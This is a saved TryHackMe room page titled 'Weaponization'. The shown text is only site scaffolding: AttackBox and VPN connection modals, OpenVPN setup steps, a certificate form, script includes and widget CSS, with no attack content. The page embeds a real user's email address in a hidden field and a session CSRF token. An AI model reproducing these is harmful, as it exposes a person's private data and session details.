<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Weaponization_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Weaponization_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/weaponization#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/weaponization#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Weaponization_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/61b8bf81f831440043d2a200">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Weaponization_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/weaponization#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/weaponization#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/weaponization#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/weaponization#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/weaponization#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Weaponization_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Weaponization_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Weaponization_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Weaponization_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Weaponization_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Weaponization_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/weaponization#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/weaponization#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Weaponization_files/notify.js"></script>
<script src="./TryHackMe _ Weaponization_files/api-requests.js"></script>
<script src="./TryHackMe _ Weaponization_files/events.js"></script>
<script src="./TryHackMe _ Weaponization_files/underscore-min.js"></script>
<script src="./TryHackMe _ Weaponization_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Weaponization_files/chart.js"></script>
<script src="./TryHackMe _ Weaponization_files/expire.js"></script>
<script src="./TryHackMe _ Weaponization_files/sockets.js"></script>
<script src="./TryHackMe _ Weaponization_files/faqSearch.js"></script>
<script src="./TryHackMe _ Weaponization_files/certificate.js"></script>
<script src="./TryHackMe _ Weaponization_files/utils.js"></script>
<script src="./TryHackMe _ Weaponization_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Weaponization_files/confetti.js"></script>
<script src="./TryHackMe _ Weaponization_files/videos.js"></script>
<script src="./TryHackMe _ Weaponization_files/intro.js"></script>
<script src="./TryHackMe _ Weaponization_files/prism.js"></script>
<script src="./TryHackMe _ Weaponization_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Weaponization_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Weaponization_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Weaponization_files/logic.js"></script>
<script src="./TryHackMe _ Weaponization_files/tasks.js"></script>
<script src="./TryHackMe _ Weaponization_files/connection-status.js"></script>
<script src="./TryHackMe _ Weaponization_files/glossary.js"></script>
<script src="./TryHackMe _ Weaponization_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Weaponization_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "5DctyDvk-kriMzMCVkdb7OhkIVJVXbK06iIo"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "weaponization"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="2BE0C26E-0E7E-5DAA-F22A-914F3938F0DB"></div><iframe id="_hjSafeContext_74869339" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Weaponization_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Weaponization_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Weaponization_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>